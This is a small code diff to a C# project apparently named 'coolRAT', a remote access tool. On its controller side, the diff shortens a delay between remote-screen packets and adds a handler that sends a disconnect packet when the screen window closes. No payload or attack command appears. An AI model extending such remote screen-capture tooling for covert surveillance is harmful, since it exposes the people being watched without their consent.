@@ -56,7 +56,7 @@ namespace coolRAT.Master
                 ScreenCommandPacket screenCommandPacket;
                 screenCommandPacket = new ScreenCommandPacket(RemoteClient.UniqueId, UniqueScreenId, Libs.Packets.CommandType.RequestFrame, "Full");
                 RemoteClient.SendPacket(screenCommandPacket);
-                Thread.Sleep(2000);
+                Thread.Sleep(500);
                 screenCommandPacket = new ScreenCommandPacket(RemoteClient.UniqueId, UniqueScreenId, Libs.Packets.CommandType.SetState, "Running");
                 RemoteClient.SendPacket(screenCommandPacket);
             });
@@ -72,6 +72,12 @@ namespace coolRAT.Master
         {
             ScreenCommandPacket screenCommandPacket = new ScreenCommandPacket(RemoteClient.UniqueId, UniqueScreenId, Libs.Packets.CommandType.SetState, "Stopped");
             RemoteClient.SendPacket(screenCommandPacket);
+        }
+
+        private void ScreenWindow_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            DisconnectScreenPacket disconnectScreenPacket = new DisconnectScreenPacket(RemoteClient.UniqueId, UniqueScreenId);
+            RemoteClient.SendPacket(disconnectScreenPacket);
         }
     }
 }
